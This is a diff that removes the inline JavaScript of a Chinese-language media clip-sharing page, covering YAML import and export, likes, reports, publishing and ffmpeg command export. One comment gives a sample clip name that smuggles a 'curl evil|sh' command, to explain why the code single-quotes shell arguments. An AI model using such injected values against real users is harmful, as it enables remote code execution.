-    function yamlToClips(text) {
-      const clips = []; let cur = null;
-      for (const line of text.split('\n')) {
-        const t = line.trim();
-        if (t.startsWith('- name:')) {
-          if (cur) clips.push(cur);
-          cur = { id:'i'+Date.now()+'-'+Math.random().toString(36).slice(2,8), name:'', description:'', startTime:0, endTime:0 };
-          try { cur.name = JSON.parse(t.slice(7).trim()); } catch (_) { cur.name = t.slice(7).trim(); }
-        } else if (t.startsWith('description:') && cur) { try { cur.description = JSON.parse(t.slice(13).trim()); } catch (_) { cur.description = t.slice(13).trim(); }
-        } else if (t.startsWith('start_time:') && cur) { cur.startTime = parseFloat(t.slice(12)) || 0;
-        } else if (t.startsWith('end_time:') && cur) { cur.endTime = parseFloat(t.slice(10)) || 0; }
-      }
-      if (cur) clips.push(cur);
-      return clips.filter(c => c.startTime < c.endTime);
-    }
-    function exportYAML(list) {
-      if (!list.length) { alert('没有可导出的片段。'); return; }
-      const yaml = clipsToYAML(list);
-      navigator.clipboard.writeText(yaml).then(() => alert('已复制 '+list.length+' 个片段到剪贴板！'), () => {
-        const ta = document.createElement('textarea'); ta.value = yaml;
-        ta.style.cssText = 'position:fixed;top:10%;left:10%;width:80%;height:80%;z-index:99999;';
-        document.body.appendChild(ta); ta.select(); setTimeout(() => ta.remove(), 30000);
-      });
-    }
-    function importYAML() {
-      const text = prompt('请粘贴 YAML 格式的片段描述：'); if (!text || !text.trim()) return;
-      const clips = yamlToClips(text); if (!clips.length) { alert('未能解析任何有效片段。'); return; }
-      if (staging.length && !confirm('暂存区已有片段，导入将追加。继续？')) return;
-      staging.push(...clips); saveLocalData(); renderAll();
-    }
-
-    // ── Shared ──
-    async function loadSharedClips() {
-      el.sharedList.innerHTML = '<div class="empty-hint">加载中...</div>';
-      try {
-        const resp = await fetch('/api/clips?file_path=' + encodeURIComponent(filePath) + '&sort=' + sharedSort + '&limit=100');
-        if (!resp.ok) throw new Error('HTTP '+resp.status);
-        renderShared((await resp.json()).clips || []);
-      } catch (err) { el.sharedList.innerHTML = '<div class="empty-hint">❌ 加载失败: '+err.message+'</div>'; }
-      el.sortTime.classList.toggle('active', sharedSort === 'time');
-      el.sortLikes.classList.toggle('active', sharedSort === 'likes');
-    }
-    function renderShared(clips) {
-      if (!clips.length) { el.sharedList.innerHTML = '<div class="empty-hint">暂无公开切片。成为第一个分享的人吧！</div>'; return; }
-      el.sharedList.replaceChildren(...clips.map(c => {
-        const card = document.createElement('div'); card.className = 'clip-card';
-        const nm = document.createElement('span'); nm.className = 'clip-card-name'; nm.textContent = c.name || '未命名'; nm.title = c.description || '';
-        const tm = document.createElement('span'); tm.className = 'clip-card-time'; tm.textContent = formatTime(c.start_time) + ' – ' + formatTime(c.end_time);
-        const meta = document.createElement('span'); meta.className = 'shared-meta'; meta.textContent = (c.nickname || '匿名') + ' · ❤️ ' + (c.like_count || 0);
-        if (c.is_featured) { const b = document.createElement('span'); b.className = 'badge badge-featured'; b.textContent = '精选'; card.appendChild(b); }
-        const acts = document.createElement('div'); acts.className = 'clip-card-actions';
-        const loadBtn = mkBtn('📥', '加载到工作区', () => setWorkspace(c.start_time, c.end_time));
-        const likeBtn = mkBtn(c.liked ? '💖' : '🤍', c.liked ? '取消赞' : '赞', function(){ toggleLike(c, this); });
-        const dlBtn = mkBtn('⬇', '导出', () => showExport(c));
-        const rptBtn = mkBtn('🚩', '举报', () => reportClip(c.id));
-        if (identity && c.identity === identity.id) {
-          const hideBtn = mkBtn('🔒', '取消公开（转为私密）', () => unpublishClip(c.id));
-          const delBtn = mkBtn('🗑', '删除', () => deleteOwnSharedClip(c.id)); delBtn.style.color = '#C0392B';
-          acts.append(loadBtn, likeBtn, dlBtn, rptBtn, hideBtn, delBtn);
-          const own = document.createElement('span'); own.className = 'badge badge-own'; own.textContent = '我的'; card.appendChild(own);
-        } else { acts.append(loadBtn, likeBtn, dlBtn, rptBtn); }
-        card.append(nm, tm, meta, acts); return card;
-      }));
-    }
-    function mkBtn(text, title, handler) { const b = document.createElement('button'); b.textContent = text; b.title = title; b.addEventListener('click', handler); return b; }
-
-    // `c.liked` comes from the server (it knows the caller's identity), so the
-    // direction is decided up front. Probing with a DELETE and retrying on 404
-    // never worked: unlike always answers 200, so the POST branch was dead.
-    async function toggleLike(c, btn) {
-      if (!ensureIdentity()) return; btn.disabled = true;
-      try {
-        const resp = await fetch('/api/clips/'+encodeURIComponent(c.id)+'/like', { method: c.liked ? 'DELETE' : 'POST' });
-        if (resp.ok) loadSharedClips();
-        else if (resp.status === 401) { identity = null; ensureIdentity(); }
-      } catch (_) {} finally { btn.disabled = false; }
-    }
-    async function reportClip(clipId) {
-      if (!ensureIdentity()) return;
-      const reason = prompt('举报原因 (选填):'); if (reason === null) return;
-      try {
-        const resp = await fetch('/api/clips/'+encodeURIComponent(clipId)+'/report', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({reason:reason||''})});
-        if (resp.ok) alert('已提交举报，管理员将审核处理。'); else alert('举报失败，请重试。');
-      } catch (_) { alert('网络错误，请重试。'); }
-    }
-    // Pull a clip back out of the shared area without destroying it — the
-    // counterpart to 公开发布. It stays in D1 with is_public = 0.
-    async function unpublishClip(clipId) {
-      if (!confirm('取消公开此切片？它将从共享区消失，但不会被删除。')) return;
-      try {
-        const resp = await fetch('/api/clips/'+encodeURIComponent(clipId), {
-          method:'PATCH', headers:{'Content-Type':'application/json'}, body:JSON.stringify({is_public:false}),
-        });
-        if (resp.ok) loadSharedClips(); else alert('操作失败。');
-      } catch (_) { alert('网络错误。'); }
-    }
-    async function deleteOwnSharedClip(clipId) {
-      if (!confirm('确认删除此公开切片？')) return;
-      try { const resp = await fetch('/api/clips/'+encodeURIComponent(clipId), {method:'DELETE'}); if (resp.ok) loadSharedClips(); else alert('删除失败。'); } catch (_) { alert('网络错误。'); }
-    }
-    async function publishClip(clip) {
-      if (!ensureIdentity()) return;
-      try {
-        const resp = await fetch('/api/clips', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({file_path:filePath, name:clip.name||'片段', description:clip.description||'', start_time:clip.startTime, end_time:clip.endTime, is_public:true})});
-        if (resp.ok) { alert('✅ 已公开分享！'); loadSharedClips(); }
-        else { const e = await resp.json().catch(()=>({})); alert('发布失败: '+(e.message||'请重试')); }
-      } catch (_) { alert('网络错误，请重试。'); }
-    }
-
-    // ── Export ──
-    // The generated line is meant to be pasted into a shell, and clip names come
-    // from other people's public clips. Double quotes do not contain `"` or `$`,
-    // so a clip named `x"; curl evil|sh; "` would run on the reader's machine.
-    // Single-quote everything: inside '…' the shell expands nothing, and the
-    // only escape needed is for a literal quote.
-    function shq(s) { return "'" + String(s).replace(/'/g, "'\\''") + "'"; }
-    function showExport(clip) {
-      const start = clip.start_time || clip.startTime || 0;
-      const duration = (clip.end_time || clip.endTime || 0) - start;
-      const name = (clip.name || 'clip') + (isAudio ? '.mp3' : '.mp4');
-      const cmd = `ffmpeg -ss ${Number(start).toFixed(1)} -i ${shq(location.origin + '/api/file/' + encodePath(fileKey))} -t ${duration.toFixed(1)} -c copy ${shq(name)}`;
-      el.exportTitle.textContent = '⬇ 导出: ' + (clip.name || '片段');
-      el.exportCmd.textContent = cmd; el.exportModal.hidden = false;
-    }
-    function copyExportCmd() {
-      navigator.clipboard.writeText(el.exportCmd.textContent).then(() => {
-        const btn = $('btn-copy-cmd'); btn.textContent = '✅ 已复制!'; setTimeout(() => { btn.textContent = '📋 复制命令'; }, 2000);
-      }).catch(() => alert('复制失败，请手动选择并复制。'));
-    }
-    function downloadFullFile() {
-      const name = filePath.split('/').pop() || 'download';
-      const a = document.createElement('a'); a.href = '/api/file/'+encodePath(fileKey)+'?download=1&name='+encodeURIComponent(name); a.download = name; a.style.display = 'none';
-      document.body.appendChild(a); a.click(); document.body.removeChild(a);
-    }
-
-    // ── Render ──
-    function renderAll() { renderStaging(); renderArchive(); }
-    function renderStaging() {
-      el.stagingCount.textContent = staging.length ? '('+staging.length+')' : '';
-      if (!staging.length) { el.stagingList.innerHTML = '<div class="empty-hint">暂存区为空。在工作区设置时间后点击"暂存"。</div>'; return; }
-      el.stagingList.replaceChildren(...staging.map(c => renderClipCard(c, 'staging')));
-    }
-    function renderArchive() {
-      el.archiveCount.textContent = archive.length ? '('+archive.length+')' : '';
-      if (!archive.length) { el.archiveList.innerHTML = '<div class="empty-hint">归档区为空。</div>'; return; }
-      el.archiveList.replaceChildren(...archive.map(c => renderClipCard(c, 'archive')));
-    }
-    function renderClipCard(c, zone) {
-      const card = document.createElement('div'); card.className = 'clip-card';
-      const nm = document.createElement('span'); nm.className = 'clip-card-name'; nm.textContent = c.name || '未命名'; nm.title = c.description||'';
-      const tm = document.createElement('span'); tm.className = 'clip-card-time'; tm.textContent = formatTime(c.startTime)+' – '+formatTime(c.endTime);
-      const acts = document.createElement('div'); acts.className = 'clip-card-actions';
-      acts.append(
-        mkBtn('📥', '加载到工作区', () => setWorkspace(c.startTime, c.endTime)),
-        mkBtn('✏️', '重命名', () => { renameClip(c.id, zone==='staging'?staging:archive); }),
-        mkBtn('📝', '描述', () => { editDescription(c.id, zone==='staging'?staging:archive); }),
-      );
-      if (zone === 'staging') {
-        acts.append(
-          mkBtn('🌐', '公开发布', () => publishClip(c)),
-          mkBtn('⬇', '导出', () => showExport(c)),
-        );
-        const del = mkBtn('🗑', '删除', () => { deleteClip(c.id, staging); renderStaging(); }); del.style.color = '#C0392B'; acts.append(del);
-      } else {
-        acts.append(
-          mkBtn('↩', '移回暂存', () => loadArchiveToStaging(c)),
-          mkBtn('⬇', '导出', () => showExport(c)),
-        );
-        const del = mkBtn('🗑', '删除', () => { deleteClip(c.id, archive); renderArchive(); }); del.style.color = '#C0392B'; acts.append(del);
-      }
-      card.append(nm, tm, acts); return card;
-    }
-
-    function encodePath(key) { return key.split('/').map(encodeURIComponent).join('/'); }
-    init();
-  </script>
+  <script src="mp4clip.js"></script>
+  <script src="clip.js"></script>
 </body>
 </html>
